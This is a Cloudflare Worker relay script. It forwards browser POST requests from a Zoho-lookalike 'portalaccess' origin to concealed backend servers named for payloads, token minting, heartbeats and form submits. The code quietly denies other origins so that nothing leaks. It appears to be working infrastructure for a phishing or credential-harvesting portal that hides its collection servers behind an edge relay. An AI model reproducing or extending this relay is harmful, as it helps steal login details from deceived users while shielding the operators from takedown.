export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // ---- Config (set these in Worker env/vars, NOT in code) ----
    const ALLOWED_ORIGIN = env.ALLOWED_ORIGIN; // "https://portalaccess.zoholandingpage.com"

    const UP_RAILWAY_GW   = env.UP_RAILWAY_GW;   // "https://blissful-motivation-production.up.railway.app/api/gw.php"
    const UP_RAILWAY_SYNC = env.UP_RAILWAY_SYNC; // "https://blissful-motivation-production.up.railway.app/api/sync.php"

    const UP_VPS_C = env.UP_VPS_C; // "https://api.adhket.icu/svc/payload.php"
    const UP_VPS_R = env.UP_VPS_R; // "https://api.adhket.icu/svc/router.php"

    const RAILWAY_RELAY_SECRET = env.RAILWAY_RELAY_SECRET; // random long secret
    const VPS_RELAY_SECRET     = env.VPS_RELAY_SECRET;     // different random long secret

    // ---- Route map ----
    const route = url.pathname;
    let upstream = null;
    let relaySecret = null;

    if (route === "/gw")   { upstream = UP_RAILWAY_GW;   relaySecret = RAILWAY_RELAY_SECRET; }
    if (route === "/sync") { upstream = UP_RAILWAY_SYNC; relaySecret = RAILWAY_RELAY_SECRET; }
    if (route === "/c")    { upstream = UP_VPS_C;        relaySecret = VPS_RELAY_SECRET; }
    if (route === "/r")    { upstream = UP_VPS_R;        relaySecret = VPS_RELAY_SECRET; }

    if (!upstream) return new Response("Not found", { status: 404 });

    // ---- Preflight ----
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: corsHeaders(ALLOWED_ORIGIN),
      });
    }

    if (request.method !== "POST") {
      return new Response("Method not allowed", { status: 405 });
    }

    // ---- CORS / browser-only gate (NOT security) ----
    const origin = request.headers.get("Origin") || "";
    if (origin && origin !== ALLOWED_ORIGIN) {
      // Quiet deny (don’t leak)
      return new Response("Not found", { status: 404 });
    }

    // ---- Lightweight rate limiting per route ----
    // Notes: This is a "good enough" edge throttle. Your real enforcement stays on Railway/VPS.
    const ip = request.headers.get("CF-Connecting-IP") || "0.0.0.0";
    const limits = getLimits(route); // { windowSec, max }
    const rlOk = await rateLimitOK(ip, route, limits.windowSec, limits.max);
    if (!rlOk) {
      return new Response("Too many requests", {
        status: 429,
        headers: corsHeaders(ALLOWED_ORIGIN),
      });
    }

    // ---- Forward request (streaming body) ----
    const contentType = request.headers.get("Content-Type") || "application/json";

    const upstreamReq = new Request(upstream, {
      method: "POST",
      headers: {
        "Content-Type": contentType,
        "User-Agent": request.headers.get("User-Agent") || "",
        "X-Edge-Relay": relaySecret,        // ✅ backend must enforce this
        "X-Edge-Route": route,              // optional debug
      },
      body: request.body,
    });

    const resp = await fetch(upstreamReq);

    // ---- Return with CORS ----
    const headers = new Headers(resp.headers);
    applyCors(headers, ALLOWED_ORIGIN);

    return new Response(resp.body, { status: resp.status, headers });


    // ---------------- helpers ----------------

    function corsHeaders(allowedOrigin) {
      return {
        "Access-Control-Allow-Origin": allowedOrigin,
        "Access-Control-Allow-Credentials": "true",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
        "Vary": "Origin",
      };
    }

    function applyCors(headers, allowedOrigin) {
      headers.set("Access-Control-Allow-Origin", allowedOrigin);
      headers.set("Access-Control-Allow-Credentials", "true");
      headers.set("Vary", "Origin");
      // defensive caching headers
      headers.set("Cache-Control", "no-store");
      headers.set("Pragma", "no-cache");
    }

    function getLimits(path) {
      // Tune as you like:
      // /gw (token mint) should be stricter than /sync (heartbeat)
      if (path === "/gw")   return { windowSec: 300, max: 25 };  // 25/5min per IP
      if (path === "/sync") return { windowSec: 300, max: 120 }; // heartbeat friendly
      if (path === "/c")    return { windowSec: 300, max: 120 }; // content fetches
      if (path === "/r")    return { windowSec: 300, max: 60 };  // form submits
      return { windowSec: 300, max: 60 };
    }

    async function rateLimitOK(ip, route, windowSec, max) {
      // Using Cloudflare cache as a simple counter store
      const bucket = Math.floor(Date.now() / 1000 / windowSec);
      const key = new Request(`https://rl.local/${route}/${bucket}/${ip}`, { method: "GET" });

      const cache = caches.default;
      let cached = await cache.match(key);

      let count = 0;
      if (cached) {
        const txt = await cached.text();
        count = parseInt(txt || "0", 10) || 0;
      }

      count++;
      // write back with TTL == window
      ctx.waitUntil(cache.put(
        key,
        new Response(String(count), {
          headers: { "Cache-Control": `public, max-age=${windowSec}` },
        })
      ));

      return count <= max;
    }
  },
};
